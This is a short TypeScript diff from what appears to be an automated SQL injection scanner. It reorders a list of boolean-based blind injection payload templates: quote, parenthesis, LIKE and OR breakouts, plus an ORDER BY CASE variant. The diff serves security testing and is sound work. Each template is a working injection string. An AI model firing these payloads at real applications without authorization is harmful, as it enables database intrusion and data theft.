@@ -1134,12 +1134,12 @@ async function diffBooleanDifferential(ctx: DiffContext): Promise<DiffOutcome> {
   // `%` breakout runs early; the remaining shapes are only worth their requests when the response
   // has already shown it reacts to syntax.
   const styles: Array<{ name: string; orBranch?: boolean; make: (k: number, truth: boolean) => string }> = [
-    { name: 'numeric', make: (k, t) => `${baseValue} AND ${k}=${t ? k : k + 1}` },
     { name: 'single_quote', make: (k, t) => `${baseValue}' AND ${k}=${t ? k : k + 1}-- -` },
+    { name: 'single_paren', make: (k, t) => `${baseValue}') AND ${k}=${t ? k : k + 1}-- -` },
     { name: 'like_breakout', make: (k, t) => `${baseValue}%' AND ${k}=${t ? k : k + 1}-- -` },
     { name: 'or_branch', orBranch: true, make: (k, t) => `${baseValue}' OR ${k}=${t ? k : k + 1}-- -` },
+    { name: 'numeric', make: (k, t) => `${baseValue} AND ${k}=${t ? k : k + 1}` },
     { name: 'double_quote', make: (k, t) => `${baseValue}" AND ${k}=${t ? k : k + 1}-- -` },
-    { name: 'single_paren', make: (k, t) => `${baseValue}') AND ${k}=${t ? k : k + 1}-- -` },
     { name: 'single_double_paren', make: (k, t) => `${baseValue}')) AND ${k}=${t ? k : k + 1}-- -` },
     { name: 'order_by', make: (k, t) => `${baseValue} ORDER BY (CASE WHEN (${k}=${t ? k : k + 1}) THEN 1 ELSE 2 END)-- -` },
   ]
